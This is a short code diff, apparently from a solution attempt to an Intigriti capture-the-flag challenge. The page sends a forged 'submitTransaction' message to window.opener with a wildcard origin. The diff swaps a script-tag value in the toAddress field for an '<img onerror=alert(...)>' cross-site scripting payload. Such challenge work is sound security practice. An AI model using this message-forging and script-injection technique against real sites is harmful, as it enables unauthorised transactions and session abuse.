@@ -21,22 +21,18 @@ fetch("https://challenge-0126.intigriti.io/api/me", {
     });
 });
 
-      window.opener.postMessage({
-  type: 'submitTransaction',
-  transaction: {
-    currency: '1337COIN',
-    amount: 10,
-    toAddress: '17d95bbc59cc74a0c5344f8d81c777ccd5'
-  }
-}, '*');
+
+      
       window.opener.postMessage({
     type: 'submitTransaction',
     transaction: {
         currency: 'BTC',
         amount: 100000,
-        toAddress: '<script>alert('0xk7edr');</script>
+        toAddress: '<img src=x onerror=alert("0xk7edr")>'
     }
 }, '*');
+
+  
 
     </script>
 
